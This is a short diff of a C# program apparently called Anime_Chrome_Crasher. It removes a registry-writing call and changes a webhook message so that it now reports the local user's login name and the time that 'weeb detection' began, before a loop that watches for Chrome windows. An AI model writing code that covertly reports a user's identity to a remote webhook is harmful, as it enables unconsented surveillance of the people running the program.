@@ -13,8 +13,7 @@ namespace Anime_Chrome_Crasher
         [STAThread]
         static void Main()
         {
-            FindWindows.AddRegistry();
-            WeebHook.SendMessage("Weeb detection started at " + DateTime.Now.ToString());
+            WeebHook.SendMessage("Weeb detection of " + Environment.UserName + " started at " + DateTime.Now.ToString());
             while (true)
             {
                 if (FindWindows.GetChrome())
